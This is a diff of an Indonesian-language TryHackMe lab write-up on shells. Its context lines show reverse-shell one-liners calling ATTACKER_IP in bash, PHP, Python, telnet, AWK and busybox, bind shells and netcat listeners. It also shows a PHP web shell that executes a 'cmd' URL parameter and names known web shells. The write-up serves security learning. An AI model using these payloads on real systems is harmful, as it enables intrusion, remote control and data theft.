@@ -1,8 +1,8 @@
 # TryHackMe: Shells Overview
 
-- **Room Link:** [Shells Overview](https://tryhackme.com/room/shellsoverview)
-- **Category:** Offensive Security Tooling
-- **Difficulty:** Easy
+* **Room Link:** [Shells Overview](https://tryhackme.com/room/shellsoverview)
+* **Category:** Offensive Security Tooling
+* **Difficulty:** Easy
 
 ## Shellls Introduction
 
@@ -12,15 +12,15 @@ Shells dalam cybersecurity sering sekali dipakai oleh attackers untuk mengontrol
 
 kita bakal bahas tujuan pembelajaran berikut:
 
-- Memahami Shells dalam Offensive Security
-- Cara Setup dan Menggunakan Reverse dan Bind Shells
-- Deploy Web Shells
+* Memahami Shells dalam Offensive Security
+* Cara Setup dan Menggunakan Reverse dan Bind Shells
+* Deploy Web Shells
 
 ### Attack Context
 
-- **Kapan teknik ini dipakai?** Tahap **Initial Access / Post-Exploitation** — setelah menemukan celah (RCE, file upload, dll) untuk mendapatkan akses interaktif ke mesin target.
-- **Syaratnya:** Sudah menemukan vulnerability yang bisa dieksploitasi (RCE, command injection, file upload) atau memiliki kredensial valid.
-- **Tanda keberhasilan:** Prompt shell muncul (`$` atau `#`) di terminal attacker, dan command `whoami`/`id` mengembalikan info user target.
+* **Kapan teknik ini dipakai?** Tahap **Initial Access / Post-Exploitation** — setelah menemukan celah (RCE, file upload, dll) untuk mendapatkan akses interaktif ke mesin target.
+* **Syaratnya:** Sudah menemukan vulnerability yang bisa dieksploitasi (RCE, command injection, file upload) atau memiliki kredensial valid.
+* **Tanda keberhasilan:** Prompt shell muncul (`$` atau `#`) di terminal attacker, dan command `whoami`/`id` mengembalikan info user target.
 
 > **Common Mistake:** Lupa menjalankan listener (`nc -lvnp PORT`) **sebelum** mengirim payload reverse shell ke target. Akibatnya, payload terkirim tapi tidak ada yang menangkap koneksinya — serangan gagal total.
 
@@ -37,12 +37,12 @@ Di dunia cyber security, shell ini merujuk ke sesi khusus yang dipake attacker p
 
 Banyak hal nakal yang bisa dilakuin kalau sudah dapet shell:
 
-- **Remote System Control**: Attacker bisa ngontrol sistem target dari jauh.
-- **Privilege Escalation**: Kalau akses awal masih terbatas (user biasa), attacker bakal cari cara buat naik pangkat jadi admin/root.
-- **Data Exfiltration**: Bisa baca dan copy data-data sensitif keluar dari sistem.
-- **Persistence**: Membuat "pintu belakang" (backdoor) atau user baru agar nanti bisa masuk lagi kapan saja tanpa harus nge-hack dari ulang.
-- **Post-Exploitation**: Aktivitas lanjutan seperti sebar malware, membuat akun tersembunyi, atau hapus jejak (logs).
-- **Pivoting**: Pakai sistem yang sudah dijebol buat nyerang sistem lain di jaringan yang sama. Jadi batu loncatan gitu.
+* **Remote System Control**: Attacker bisa ngontrol sistem target dari jauh.
+* **Privilege Escalation**: Kalau akses awal masih terbatas (user biasa), attacker bakal cari cara buat naik pangkat jadi admin/root.
+* **Data Exfiltration**: Bisa baca dan copy data-data sensitif keluar dari sistem.
+* **Persistence**: Membuat "pintu belakang" (backdoor) atau user baru agar nanti bisa masuk lagi kapan saja tanpa harus nge-hack dari ulang.
+* **Post-Exploitation**: Aktivitas lanjutan seperti sebar malware, membuat akun tersembunyi, atau hapus jejak (logs).
+* **Pivoting**: Pakai sistem yang sudah dijebol buat nyerang sistem lain di jaringan yang sama. Jadi batu loncatan gitu.
 
 Intinya, semua jenis shell yang bakal kita bahas nanti tujuannya ya buat memfasilitasi aksi-aksi di atas ini.
 
@@ -85,10 +85,10 @@ listening on [any] 4444 ...
 
 Penjelasan flag-nya:
 
-- `-l`: **Listen mode**, memerintah Netcat buat nunggu koneksi masuk.
-- `-v`: **Verbose**, agar lebih cerewet (menampilkan output lebih detail).
-- `-n`: **No DNS**, tidak usah resolve hostname, pakai IP saja agar cepat.
-- `-p`: **Port**, menentukan port mana yang mau dipake buat nunggu (contoh di atas pakai port **443**).
+* `-l`: **Listen mode**, memerintah Netcat buat nunggu koneksi masuk.
+* `-v`: **Verbose**, agar lebih cerewet (menampilkan output lebih detail).
+* `-n`: **No DNS**, tidak usah resolve hostname, pakai IP saja agar cepat.
+* `-p`: **Port**, menentukan port mana yang mau dipake buat nunggu (contoh di atas pakai port **443**).
 
 **Tips:** Kenapa pakai port 443?
 Sebenernya port berapa saja bisa (53, 80, 8080, 139, 445), tapi attacker sering pakai port umum seperti **80 (HTTP)** atau **443 (HTTPS)**. Tujuannya agar koneksinya nyatu sama traffic internet biasa, jadi tidak dicurigai sama security appliances atau firewall.
@@ -109,11 +109,11 @@ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_P
 
 **Penjelasan Payload:**
 
-- `rm -f /tmp/f`: Hapus file `/tmp/f` kalau sudah ada, agar tidak error.
-- `mkfifo /tmp/f`: Membuat **Named Pipe** (FIFO - First In First Out) di `/tmp/f`. Pipe ini fungsinya seperti saluran komunikasi dua arah.
-- `cat /tmp/f`: Baca data dari pipe itu dan nunggu input masuk.
-- `| sh -i 2>&1`: Output dari `cat` (input kita) dioper ke shell (`sh`) secara interaktif (`-i`). `2>&1` artinya redirect error message ke standard output, jadi kita bisa melihat kalau ada error.
-- `| nc ATTACKER_IP ATTACKER_PORT >/tmp/f`: Output dari shell (hasil perintah yang dijalankan) dikirim balik ke attacker lewat Netcat. Tanda `>/tmp/f` mengembalikan lagi outputnya ke pipe awal, agar jadi _loop_ komunikasi dua arah yang jalan terus.
+* `rm -f /tmp/f`: Hapus file `/tmp/f` kalau sudah ada, agar tidak error.
+* `mkfifo /tmp/f`: Membuat **Named Pipe** (FIFO : First In First Out) di `/tmp/f`. Pipe ini fungsinya seperti saluran komunikasi dua arah.
+* `cat /tmp/f`: Baca data dari pipe itu dan nunggu input masuk.
+* `| sh -i 2>&1`: Output dari `cat` (input kita) dioper ke shell (`sh`) secara interaktif (`-i`). `2>&1` artinya redirect error message ke standard output, jadi kita bisa melihat kalau ada error.
+* `| nc ATTACKER_IP ATTACKER_PORT >/tmp/f`: Output dari shell (hasil perintah yang dijalankan) dikirim balik ke attacker lewat Netcat. Tanda `>/tmp/f` mengembalikan lagi outputnya ke pipe awal, agar jadi _loop_ komunikasi dua arah yang jalan terus.
 
 Intinya, payload ini membuka shell `bash` atau `sh` dan "membuang" input/output-nya ke Netcat listener kita.
 
@@ -167,12 +167,12 @@ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /t
 
 **Penjelasan Payload:**
 
-- `rm -f /tmp/f`: Hapus file `/tmp/f` kalau ada, agar bersih dan tidak konflik.
-- `mkfifo /tmp/f`: Membuat **Named Pipe** di `/tmp/f`. Ini saluran komunikasi dua arah kita.
-- `cat /tmp/f`: Baca data dari pipe dan nunggu input.
-- `| bash -i 2>&1`: Output `cat` dioper ke shell `bash` secara interaktif. Error message (`stderr`) juga diredirect ke `stdout`.
-- `| nc -l 0.0.0.0 8080`: Jalanin Netcat dalam **listen mode** (`-l`) di semua interface (`0.0.0.0`) port **8080**. Ini intinya nungguin attacker buat connect.
-- `> /tmp/f`: Output dari Netcat (hasil perintah shell) dibalikin lagi ke pipe, agar komunikasinya nyambung terus.
+* `rm -f /tmp/f`: Hapus file `/tmp/f` kalau ada, agar bersih dan tidak konflik.
+* `mkfifo /tmp/f`: Membuat **Named Pipe** di `/tmp/f`. Ini saluran komunikasi dua arah kita.
+* `cat /tmp/f`: Baca data dari pipe dan nunggu input.
+* `| bash -i 2>&1`: Output `cat` dioper ke shell `bash` secara interaktif. Error message (`stderr`) juga diredirect ke `stdout`.
+* `| nc -l 0.0.0.0 8080`: Jalanin Netcat dalam **listen mode** (`-l`) di semua interface (`0.0.0.0`) port **8080**. Ini intinya nungguin attacker buat connect.
+* `> /tmp/f`: Output dari Netcat (hasil perintah shell) dibalikin lagi ke pipe, agar komunikasinya nyambung terus.
 
 **Catatan:**
 Kita pakai port **8080** karena port di bawah 1024 (seperti 80, 443) butuh akses **root** (elevated privileges). Kalau kita cuma user biasa, kita harus pakai port tinggi (di atas 1024).
@@ -197,11 +197,11 @@ nc -nv TARGET_IP 8080
 
 **Penjelasan Command:**
 
-- `nc`: Panggil Netcat.
-- `-n`: **No DNS**, agar cepat dan tidak berisik melakukan DNS lookup.
-- `-v`: **Verbose**, agar kita tau pas koneksinya berhasil ("open").
-- `TARGET_IP`: IP address mesin target yang sudah kita pasangin bind shell.
-- `8080`: Port yang lagi dibuka sama bind shell di target.
+* `nc`: Panggil Netcat.
+* `-n`: **No DNS**, agar cepat dan tidak berisik melakukan DNS lookup.
+* `-v`: **Verbose**, agar kita tau pas koneksinya berhasil ("open").
+* `TARGET_IP`: IP address mesin target yang sudah kita pasangin bind shell.
+* `8080`: Port yang lagi dibuka sama bind shell di target.
 
 **Attacker Terminal (After Connection):**
 
@@ -272,9 +272,9 @@ attacker@arch:~$ socat -d -d TCP-LISTEN:443 STDOUT
 
 **Penjelasan Command:**
 
-- `-d -d`: **Debug** mode (verbose), agar muncul pesen log-nya.
-- `TCP-LISTEN:443`: Membuat listener TCP di port 443.
-- `STDOUT`: Arahin data yang masuk ke layar terminal (Standard Output).
+* `-d -d`: **Debug** mode (verbose), agar muncul pesen log-nya.
+* `TCP-LISTEN:443`: Membuat listener TCP di port 443.
+* `STDOUT`: Arahin data yang masuk ke layar terminal (Standard Output).
 
 Socat syntax nya agak beda dan lebih kompleks, tapi fiturnya jauh lebih canggih daripada Netcat biasa.
 
@@ -298,10 +298,10 @@ bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
 
 **Penjelasan Command:**
 
-- `bash -i`: Jalanin shell Bash secara **interaktif**.
-- `>&`: Redirect output (stdout) dan error (stderr) ke alamat yang sama.
-- `/dev/tcp/ATTACKER_IP/443`: Ini fitur unik Bash. Dia membuka koneksi TCP ke `ATTACKER_IP` di port `443`.
-- `0>&1`: Redirect input (stdin) ke stdout (yang sudah tersambung ke koneksi TCP tadi).
+* `bash -i`: Jalanin shell Bash secara **interaktif**.
+* `>&`: Redirect output (stdout) dan error (stderr) ke alamat yang sama.
+* `/dev/tcp/ATTACKER_IP/443`: Ini fitur unik Bash. Dia membuka koneksi TCP ke `ATTACKER_IP` di port `443`.
+* `0>&1`: Redirect input (stdin) ke stdout (yang sudah tersambung ke koneksi TCP tadi).
 
 Intinya, command ini membuat input dan output shell Bash kita "nyambung" langsung ke komputer attacker lewat jaringan.
 
@@ -317,9 +317,9 @@ exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; 
 
 **Penjelasan:**
 
-- `exec 5<>...`: Membuat file descriptor baru (nomor 5) yang nyambung ke koneksi TCP.
-- `while read line`: Baca perintah dari attacker lewat file descriptor 5.
-- `$line 2>&5 >&5`: Jalanin perintahnya, terus kirim output dan error balik ke file descriptor 5 (ke attacker).
+* `exec 5<>...`: Membuat file descriptor baru (nomor 5) yang nyambung ke koneksi TCP.
+* `while read line`: Baca perintah dari attacker lewat file descriptor 5.
+* `$line 2>&5 >&5`: Jalanin perintahnya, terus kirim output dan error balik ke file descriptor 5 (ke attacker).
 
 **2. Bash With File Descriptor 196**
 
@@ -339,9 +339,9 @@ bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
 **Penjelasan:**
 Mirip banget sama yang pertama, tapi lebih ringkas.
 
-- `bash -i`: Jalanin bash interaktif.
-- `5<> /dev/tcp...`: Buka koneksi TCP di fd 5.
-- `0<&5 1>&5 2>&5`: Redirect semua standar input (0), output (1), dan error (2) ke fd 5.
+* `bash -i`: Jalanin bash interaktif.
+* `5<> /dev/tcp...`: Buka koneksi TCP di fd 5.
+* `0<&5 1>&5 2>&5`: Redirect semua standar input (0), output (1), dan error (2) ke fd 5.
 
 ### PHP
 
@@ -355,9 +355,9 @@ php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
 
 **Penjelasan Payload:**
 
-- `php -r`: Jalanin kode PHP langsung dari terminal (inline).
-- `fsockopen("ATTACKER_IP",443)`: Buka koneksi socket ke attacker.
-- `exec("sh <&3 >&3 2>&3")`: Jalanin shell `sh`. Angka `3` di sini adalah file descriptor yang dipake sama socket tadi. Jadi input/output shell dialirin lewat socket itu.
+* `php -r`: Jalanin kode PHP langsung dari terminal (inline).
+* `fsockopen("ATTACKER_IP",443)`: Buka koneksi socket ke attacker.
+* `exec("sh <&3 >&3 2>&3")`: Jalanin shell `sh`. Angka `3` di sini adalah file descriptor yang dipake sama socket tadi. Jadi input/output shell dialirin lewat socket itu.
 
 Payload ini sering dipake di web shell atau RCE (Remote Code Execution) di aplikasi web berbasis PHP.
 
@@ -407,9 +407,9 @@ export RHOST="ATTACKER_IP"; export RPORT=443; python -c 'import sys,socket,os,pt
 
 **Penjelasan Payload:**
 
-- `export RHOST` & `export RPORT`: Kita set IP attacker dan Port sebagai environment variable dulu.
-- `os.getenv`: Python bakal baca variable RHOST dan RPORT tadi buat dipakek konek.
-- `pty.spawn("/bin/sh")`: Ini kuncinya buat dapet shell yang stabil (interaktif).
+* `export RHOST` & `export RPORT`: Kita set IP attacker dan Port sebagai environment variable dulu.
+* `os.getenv`: Python bakal baca variable RHOST dan RPORT tadi buat dipakek konek.
+* `pty.spawn("/bin/sh")`: Ini kuncinya buat dapet shell yang stabil (interaktif).
 
 **2. Python Reverse Shell Using the subprocess Module**
 
@@ -419,8 +419,8 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 **Penjelasan Payload:**
 
-- `subprocess.call`: Kita pakai modul `subprocess` untuk menjalankan shell `/bin/sh`.
-- `os.dup2`: Redirect stdin, stdout, stderr ke socket.
+* `subprocess.call`: Kita pakai modul `subprocess` untuk menjalankan shell `/bin/sh`.
+* `os.dup2`: Redirect stdin, stdout, stderr ke socket.
 
 **3. Short Python Reverse Shell**
 
@@ -430,9 +430,9 @@ python -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443))
 
 **Penjelasan Payload:**
 
-- Versi one-liner yang lebih ringkas.
-- Pakai list comprehension `[os.dup2(...) for f in (0,1,2)]` agar hemat karakter.
-- Langsung spawn `/bin/bash`.
+* Versi one-liner yang lebih ringkas.
+* Pakai list comprehension `[os.dup2(...) for f in (0,1,2)]` agar hemat karakter.
+* Langsung spawn `/bin/bash`.
 
 ### Others
 
@@ -446,10 +446,10 @@ TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP 443 0<$TF | sh 1>$TF
 
 **Penjelasan:**
 
-- `mktemp -u`: Membuat nama file temporary unik.
-- `mkfifo $TF`: Membuat named pipe.
-- `telnet ...`: Konek ke attacker.
-- `| sh`: Output dari telnet (perintah dari attacker) di-pipe ke shell buat dieksekusi.
+* `mktemp -u`: Membuat nama file temporary unik.
+* `mkfifo $TF`: Membuat named pipe.
+* `telnet ...`: Konek ke attacker.
+* `| sh`: Output dari telnet (perintah dari attacker) di-pipe ke shell buat dieksekusi.
 
 **2. AWK**
 
@@ -459,10 +459,10 @@ awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |
 
 **Penjelasan:**
 
-- AWK punya fitur TCP built-in
-- `/inet/tcp/0/...`: Syntax khusus AWK buat buka koneksi TCP.
-- `|&`: Operator buat komunikasi dua arah di AWK.
-- Script ini intinya baca perintah dari attacker, jalanin, terus kirim balik outputnya.
+* AWK punya fitur TCP built-in
+* `/inet/tcp/0/...`: Syntax khusus AWK buat buka koneksi TCP.
+* `|&`: Operator buat komunikasi dua arah di AWK.
+* Script ini intinya baca perintah dari attacker, jalanin, terus kirim balik outputnya.
 
 **3. BusyBox**
 
@@ -472,9 +472,9 @@ busybox nc ATTACKER_IP 443 -e sh
 
 **Penjelasan:**
 
-- BusyBox itu seperti swiss army knife nya Linux embedded, isinya banyak tools standar yang digabung jadi satu binary kecil.
-- Payload ini sebenernya cuma manggil `nc` (Netcat) yang ada di dalem BusyBox.
-- `-e sh`: Execute shell setelah konek (fitur yang sering ilang di Netcat biasa, tapi ada di versi BusyBox).
+* BusyBox itu seperti swiss army knife nya Linux embedded, isinya banyak tools standar yang digabung jadi satu binary kecil.
+* Payload ini sebenernya cuma manggil `nc` (Netcat) yang ada di dalem BusyBox.
+* `-e sh`: Execute shell setelah konek (fitur yang sering ilang di Netcat biasa, tapi ada di versi BusyBox).
 
 ## Web Shells
 
@@ -496,8 +496,8 @@ if (isset($_GET['cmd'])) {
 
 **Penjelasan Code:**
 
-- `$_GET['cmd']`: Script ini bakal nunggu input parameter bernama `cmd` dari URL (method GET).
-- `system(...)`: Fungsi ini akan menjalankan apapun isi dari `cmd` sebagai perintah sistem.
+* `$_GET['cmd']`: Script ini bakal nunggu input parameter bernama `cmd` dari URL (method GET).
+* `system(...)`: Fungsi ini akan menjalankan apapun isi dari `cmd` sebagai perintah sistem.
 
 **Cara Pakainya:**
 Kalau script ini disimpan dengan nama `shell.php` di web server, attacker tinggal buka URL seperti gini:
@@ -512,17 +512,17 @@ Browser bakal menampilkan hasil command `whoami` (misal: `www-data`). Cuma modal
 
 Kekuatan bahasa pemrograman yang didukung oleh web server memungkinkan web shells punya banyak fungsionalitas dan bisa menghindari deteksi di waktu yang sama. Ayo kita eksplor beberapa web shell paling populer yang bisa ditemukan online:
 
-- **p0wny-shell** - Web shell PHP satu file yang minimalis tapi bisa buat remote command execution.
+* **p0wny-shell** : Web shell PHP satu file yang minimalis tapi bisa buat remote command execution.
 <p align="center">
 <img src="../../Assets/Images/pownyshell.png" alt="p0wny-shell">
 </p>
 
-- **b374k shell** - Web shell PHP yang lebih kaya fitur dengan kemampuan file management dan command execution, serta fungsionalitas lainnya.
+* **b374k shell** : Web shell PHP yang lebih kaya fitur dengan kemampuan file management dan command execution, serta fungsionalitas lainnya.
 <p align="center">
 <img src="../../Assets/Images/b734kshell.png" alt="b374k shell">
 </p>
 
-- **c99 shell** - Web shell PHP yang terkenal dan tangguh dengan fungsionalitas yang sangat luas.
+* **c99 shell** : Web shell PHP yang terkenal dan tangguh dengan fungsionalitas yang sangat luas.
 <p align="center">
 <img src="../../Assets/Images/c99shell.png" alt="c99 shell">
 </p>
